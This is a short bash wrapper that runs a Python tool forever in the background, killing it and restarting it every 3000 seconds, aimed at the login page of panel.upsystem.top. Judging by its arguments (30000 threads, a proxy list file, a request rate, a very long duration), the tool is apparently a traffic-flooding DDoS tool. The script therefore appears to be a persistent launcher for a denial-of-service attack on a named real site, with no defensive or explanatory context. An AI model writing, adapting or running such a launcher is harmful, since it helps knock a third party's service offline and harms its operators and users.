#!/bin/bash
sleep_time=3000
while :
do
  pid=`ps -aux |grep "python3 start.py null http://panel.upsystem.top/#/login 5 30000 1.txt 10000 854854"|grep -v "grep" |awk '{print $2}'`
  kill -9 $pid
  nohup python3 start.py null http://panel.upsystem.top/#/login 5 30000 1.txt 10000 854854 >> /dev/null 2>&1 &
  sleep $sleep_time
done
